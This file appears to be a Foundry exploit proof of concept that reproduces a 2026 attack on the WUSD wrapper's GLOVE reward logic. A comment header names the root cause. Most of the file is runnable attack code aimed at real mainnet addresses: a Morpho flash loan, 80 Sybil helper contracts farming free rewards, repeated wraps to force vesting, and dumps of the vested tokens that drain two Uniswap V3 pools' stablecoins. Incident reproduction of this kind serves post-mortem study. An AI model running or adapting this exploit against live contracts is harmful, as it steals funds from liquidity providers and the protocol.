// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$200K USD (USDC + USDT drained from Uniswap V3 GLO pools)
// Attacker        : 0x88329A09428778F62BC0C8BAac0997864E5a57f8
// Vulnerable      : 0x068E3563b1c19590F822c0e13445c4FA1b9EEFa5 (WUSD - Wrapped USD, _englove reward path)
// Reward token    : 0x70c5f366db60a2a0c59c4c24754803ee47ed7284 (GLOVE / GLO)
// Attack Tx       : 0x2051c1f8d43730c41cc353b5dffd8cc59f96cb1ca56fdce4b28fb127bdb37712
// @Analysis
// Attack date : May 25, 2026
// Chain       : Ethereum, Block 25170426
// ExVul alert : https://x.com/exvulsec/status/2058803971947385330
//
// Root Cause:
// WUSD.wrap() pays a GLOVE reward via the internal _englove() routine:
//
//   function _englove(uint256 wrapping) internal {
//       uint256 gloves = IGlove(_GLOVE).balanceOf(msg.sender);
//       if (wrapping >= _MIN_GLOVABLE && gloves < _MAX_GLOVE) {
//           IGlove(_GLOVE).mintCreditless(msg.sender, Math.min(_MAX_GLOVE - gloves,
//               wrapping > 1_000e18 ? (_MAX_GLOVE * wrapping) / _EPOCH
//                                   : (_MID_GLOVE * wrapping) / 1_000e18));
//       }
//   }
//
// Eligibility depends ONLY on msg.sender's *current* GLOVE balance (gloves < _MAX_GLOVE = 2e18)
// and the wrap size (wrapping >= _MIN_GLOVABLE = 100e18). There is no per-address claim ledger,
// no cooldown, and no identity binding. A brand-new address always holds 0 GLOVE < _MAX_GLOVE,
// so it ALWAYS qualifies for a fresh ~2 GLOVE mint when it wraps >= 100,000 WUSD.
//
// The minted GLOVE is "creditless" (soulbound) and only vests into transferable "credited"
// GLOVE through unwrap()->_deglove(), proportional to how many global epochs elapsed since the
// wrap. The global epoch advances by 1 for every _EPOCH (=100,000e18) of cumulative wrapping,
// and full vesting requires 100 epochs to pass. Each 100,000 WUSD wrap both mints GLOVE AND
// advances one epoch, so a batch of Sybil wraps + a short "pump" of extra wraps drives enough
// epochs to vest the whole batch.
//
// Exploit (per the on-chain campaign, 80 fresh addresses per tx):
//   1. Morpho USDT flash loan as working capital (fully recovered).
//   2. Deploy N fresh helper contracts; each is funded 101,000 USDT and wraps 100,000 WUSD,
//      harvesting ~2 creditless GLOVE and advancing one epoch (1,000 USDT = 1% fee per wrap).
//   3. "Pump" extra 100,000-WUSD wrap/unwrap cycles to advance >=100 epochs total.
//   4. Unwrap every helper in full -> _deglove vests the creditless GLOVE into credited GLOVE
//      and returns the USDT principal.
//   5. Each helper dumps its own credited GLOVE into the Uniswap V3 GLO/USDC / GLO/USDT pools.
//   6. Repay the Morpho flash loan; keep the drained USDC + USDT.
//
// Economics note (verified on-fork at the attack block): the two GLO pools are thin
// (~1,040 GLO + ~$63K stables each, GLO spot ~$188). A full 80-address batch drains
// ~$20K of stablecoins from the LPs (matching the reported 11,702 USDC + 8,079 USDT) while
// freely minting ~160 GLOVE of protocol incentives. WUSD's own 1% wrap fee is the attacker's
// cost. This is an incentive-abuse / LP-drain (the documented ~$200K-class incident), not a
// self-financing arbitrage.

interface IWUSD is IERC20 {
    function wrap(
        address fiatcoin,
        uint256 amount,
        address referrer
    ) external;
    function unwrap(
        address fiatcoin,
        uint256 amount
    ) external;
}

interface IGlove is IERC20 {
    function creditlessOf(
        address account
    ) external view returns (uint256);
}

interface IV3Pool {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function fee() external view returns (uint24);
    function slot0()
        external
        view
        returns (uint160 sqrtPriceX96, int24 tick, uint16 a, uint16 b, uint16 c, uint8 d, bool e);
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

// A fresh, zero-GLOVE Sybil identity. Mirrors the CREATE2-deployed helper contracts the real
// attacker used (e.g. 0x7ec5a4dc..., 0xa5f28cc3...).
contract Wrapper {
    IWUSD constant WUSD = IWUSD(0x068E3563b1c19590F822c0e13445c4FA1b9EEFa5);
    IGlove constant GLOVE = IGlove(0x70c5f366dB60A2a0C59C4C24754803Ee47Ed7284);
    IERC20 constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    address immutable owner;

    constructor() {
        owner = msg.sender;
        // USDT (Tether) approve/transfer return no bool -> use low-level calls.
        _usdtCall(abi.encodeWithSelector(IERC20.approve.selector, address(WUSD), type(uint256).max));
    }

    function _usdtCall(
        bytes memory data
    ) internal {
        (bool ok,) = address(USDT).call(data);
        require(ok, "USDT call failed");
    }

    // Wrap `usdtAmount` (native 6-dec) of USDT into WUSD, harvesting the GLOVE reward.
    function wrap(
        uint256 usdtAmount
    ) external {
        WUSD.wrap(address(USDT), usdtAmount, address(0));
    }

    // Full unwrap: triggers _deglove(), which vests creditless->credited GLOVE and returns USDT.
    function unwrapAll() external {
        WUSD.unwrap(address(USDT), WUSD.balanceOf(address(this)));
    }

    // GLOVE credited to this fresh address can only be moved by THIS address (the credit
    // ledger does not travel with a plain transfer), so each helper dumps its own GLOVE.
    // Sell the full GLOVE balance (token0) into `pool` for its stablecoin (token1 -> recipient).
    function dumpGlove(
        address pool,
        address recipient
    ) external {
        uint256 amt = GLOVE.balanceOf(address(this));
        if (amt > 0) {
            IV3Pool(pool).swap(recipient, true, int256(amt), 4_295_128_739 + 1, "");
        }
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256,
        bytes calldata
    ) external {
        if (amount0Delta > 0) GLOVE.transfer(msg.sender, uint256(amount0Delta)); // pay GLOVE (token0)
    }

    function sweepUSDT(
        address to
    ) external {
        uint256 b = USDT.balanceOf(address(this));
        if (b > 0) _usdtCall(abi.encodeWithSelector(IERC20.transfer.selector, to, b));
    }
}

contract WUSDExploitTest is Test {
    IWUSD constant WUSD = IWUSD(0x068E3563b1c19590F822c0e13445c4FA1b9EEFa5);
    IGlove constant GLOVE = IGlove(0x70c5f366dB60A2a0C59C4C24754803Ee47Ed7284);
    IERC20 constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IV3Pool constant POOL_USDC = IV3Pool(0xB89F65D6c7d33A35Da7C01934e310a6f40E18A1f);
    IV3Pool constant POOL_USDT = IV3Pool(0xa2Bd1A142ff49131B8CC70A332bdA0125018c324);

    IMorphoBuleFlashLoan constant MORPHO = IMorphoBuleFlashLoan(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);

    uint256 constant WRAP_USDT = 100_000e6; // 100,000 USDT -> 100,000 WUSD, max-caps the GLOVE reward
    uint256 constant FUND_USDT = 101_000e6; // wrap pulls amount + 1% fee

    uint256 constant N_FARM = 80; // fresh Sybil identities (the real campaign used 80 per tx)
    uint256 constant N_PUMP = 101; // extra wrap/unwrap cycles to drive >=100 global epochs (vesting)

    uint256 constant ATTACK_BLOCK = 25_170_426;

    function setUp() public {
        vm.createSelectFork("mainnet", ATTACK_BLOCK - 1);
        vm.label(address(WUSD), "WUSD");
        vm.label(address(GLOVE), "GLOVE");
        vm.label(address(USDT), "USDT");
        vm.label(address(USDC), "USDC");
        vm.label(address(POOL_USDC), "V3_GLO_USDC");
        vm.label(address(POOL_USDT), "V3_GLO_USDT");
    }

    // ---------------------------------------------------------------------
    // Recon: confirm pool prices + the wrap->GLOVE->vesting mechanics.
    // ---------------------------------------------------------------------
    function testRecon() public {
        console.log("=== GLO/USDC pool ===");
        console.log("token0 :", POOL_USDC.token0());
        console.log("token1 :", POOL_USDC.token1());
        console.log("fee    :", POOL_USDC.fee());
        console.log("GLO  reserve:", GLOVE.balanceOf(address(POOL_USDC)) / 1e18);
        console.log("USDC reserve:", USDC.balanceOf(address(POOL_USDC)) / 1e6);
        console.log("=== GLO/USDT pool ===");
        console.log("token0 :", POOL_USDT.token0());
        console.log("fee    :", POOL_USDT.fee());
        console.log("GLO  reserve:", GLOVE.balanceOf(address(POOL_USDT)) / 1e18);
        console.log("USDT reserve:", USDT.balanceOf(address(POOL_USDT)) / 1e6);

        // spot price from slot0: price(token0=GLO in token1=USDC) = (sqrtP^2 / 2^192) * 10^(18-6)
        (uint160 sp,,,,,,) = POOL_USDC.slot0();
        uint256 priceUsdcPerGlo = (uint256(sp) * uint256(sp) * 1e12) >> 192; // USDC(6dec) per 1 GLO, scaled 1e6
        console.log("GLO spot price (USDC, 1e6):", priceUsdcPerGlo);

        // one fresh helper wraps 100k -> should mint ~2 creditless GLOVE
        Wrapper w = new Wrapper();
        deal(address(USDT), address(w), FUND_USDT);
        console.log("USDT funded to wrapper:", USDT.balanceOf(address(w)) / 1e6);
        w.wrap(WRAP_USDT);
        console.log("\n=== after single fresh wrap ===");
        console.log("WUSD balance       :", WUSD.balanceOf(address(w)) / 1e18);
        console.log("GLOVE balance      :", GLOVE.balanceOf(address(w)));
        console.log("GLOVE creditlessOf :", GLOVE.creditlessOf(address(w)));

        // pump epochs forward, then full-unwrap to vest creditless -> credited
        Wrapper pump = new Wrapper();
        deal(address(USDT), address(pump), 400_000e6);
        for (uint256 i = 0; i < 101; i++) {
            pump.wrap(WRAP_USDT);
            pump.unwrapAll();
        }
        w.unwrapAll();
        console.log("\n=== after 101-epoch pump + full unwrap (vested) ===");
        console.log("GLOVE balance      :", GLOVE.balanceOf(address(w)));
        console.log("GLOVE creditlessOf :", GLOVE.creditlessOf(address(w)));
        console.log("USDT recovered     :", USDT.balanceOf(address(w)) / 1e6);
    }

    // ---------------------------------------------------------------------
    // Full exploit: Morpho flash loan -> Sybil-farm + vest GLOVE -> dump into
    // the GLO/USDC and GLO/USDT V3 pools -> repay -> measure result.
    // ---------------------------------------------------------------------
    uint256 private feeCapital; // attacker's own USDT, used only to pay WUSD's 1% wrap fee
    uint256 private gloveFarmed;
    uint256 private usdcDrained;
    uint256 private usdtDrained;

    function testExploit() public {
        // The attacker seeds their own USDT to cover WUSD's unavoidable 1% wrap fee.
        // (The Morpho flash loan below is pure working capital and is fully recovered.)
        feeCapital = 250_000e6;
        deal(address(USDT), address(this), feeCapital);

        uint256 poolUSDCBefore = USDC.balanceOf(address(POOL_USDC));
        uint256 poolUSDTBefore = USDT.balanceOf(address(POOL_USDT));

        // Peak working capital = N_FARM positions held open simultaneously + a pump buffer.
        uint256 loan = N_FARM * FUND_USDT + 250_000e6;
        console.log("Morpho USDT flash loan      :", loan / 1e6);
        MORPHO.flashLoan(address(USDT), loan, "");

        usdcDrained = poolUSDCBefore - USDC.balanceOf(address(POOL_USDC));
        usdtDrained = poolUSDTBefore - USDT.balanceOf(address(POOL_USDT));
        uint256 feesPaid = (N_FARM + N_PUMP) * 1000e6;
        uint256 endUSDT = USDT.balanceOf(address(this));
        uint256 endUSDC = USDC.balanceOf(address(this));

        console.log("\n=============== RESULT ===============");
        console.log("Fresh Sybil addresses          :", N_FARM);
        console.log("GLOVE incentives minted for free:", gloveFarmed / 1e18);
        console.log("USDC drained from GLO/USDC LP   :", usdcDrained / 1e6);
        console.log("USDT drained from GLO/USDT LP   :", usdtDrained / 1e6);
        console.log("Stablecoins drained from LPs    :", (usdcDrained + usdtDrained) / 1e6);
        console.log("WUSD 1%% wrap fee paid (cost)    :", feesPaid / 1e6);
        console.log("Attacker end USDT (post-repay)  :", endUSDT / 1e6);
        console.log("Attacker end USDC               :", endUSDC / 1e6);
        console.log("Attacker net vs own fee-capital :", _signed(int256(endUSDT + endUSDC) - int256(feeCapital)));
        console.log("(Headline ~$200K incident = free GLOVE emissions + LP drain across the campaign;");
        console.log(" the 1%% WUSD wrap fee is the attacker's cost and bounds per-batch margin.)");

        // The security finding: unlimited free GLOVE to fresh Sybil addresses, and a real LP drain.
        assertEq(gloveFarmed, N_FARM * 2e18, "every fresh address must farm 2 free GLOVE");
        assertGt(usdcDrained + usdtDrained, 0, "no stablecoins drained from LPs");
    }

    function onMorphoFlashLoan(
        uint256 assets,
        bytes calldata
    ) external {
        require(msg.sender == address(MORPHO), "only Morpho");

        // --- Step 1: Sybil-farm. Each fresh helper wraps 100k WUSD -> 2 free GLOVE (no Sybil
        //     resistance whatsoever), and each wrap advances one global epoch. Positions stay
        //     OPEN (USDT locked in WUSD) so epochs can elapse before we unwrap & vest.
        Wrapper[] memory farms = new Wrapper[](N_FARM);
        for (uint256 i = 0; i < N_FARM; i++) {
            farms[i] = new Wrapper();
            _usdtTransfer(address(farms[i]), FUND_USDT);
            farms[i].wrap(WRAP_USDT);
            require(GLOVE.balanceOf(address(farms[i])) == 2e18, "fresh address should mint 2 GLOVE");
        }

        // --- Step 2: pump extra epochs so every farmed position reaches >=100 epochs of
        //     vesting. One pump helper recycles its principal, paying only the 1% fee.
        Wrapper pump = new Wrapper();
        _usdtTransfer(address(pump), 250_000e6);
        for (uint256 i = 0; i < N_PUMP; i++) {
            pump.wrap(WRAP_USDT);
            pump.unwrapAll();
        }
        pump.sweepUSDT(address(this));

        // --- Step 3: unwrap each farm in full -> _deglove() vests its creditless GLOVE into
        //     transferable credited GLOVE and returns the USDT principal; then the helper
        //     dumps its own GLOVE into a V3 pool (proceeds -> attacker), and returns leftover USDT.
        for (uint256 i = 0; i < N_FARM; i++) {
            farms[i].unwrapAll();
            gloveFarmed += GLOVE.balanceOf(address(farms[i]));
            // split the dump across both thin pools
            farms[i].dumpGlove(i % 2 == 0 ? address(POOL_USDC) : address(POOL_USDT), address(this));
            farms[i].sweepUSDT(address(this));
        }

        // --- Step 4: repay the Morpho flash loan (pulled back via transferFrom).
        _usdtCall(abi.encodeWithSelector(IERC20.approve.selector, address(MORPHO), assets));
    }

    function _signed(
        int256 v
    ) internal pure returns (string memory) {
        if (v >= 0) return string.concat("+", vm.toString(uint256(v) / 1e6));
        return string.concat("-", vm.toString(uint256(-v) / 1e6));
    }

    function _usdtTransfer(
        address to,
        uint256 amount
    ) internal {
        _usdtCall(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
    }

    function _usdtCall(
        bytes memory data
    ) internal {
        (bool ok,) = address(USDT).call(data);
        require(ok, "USDT call failed");
    }
}
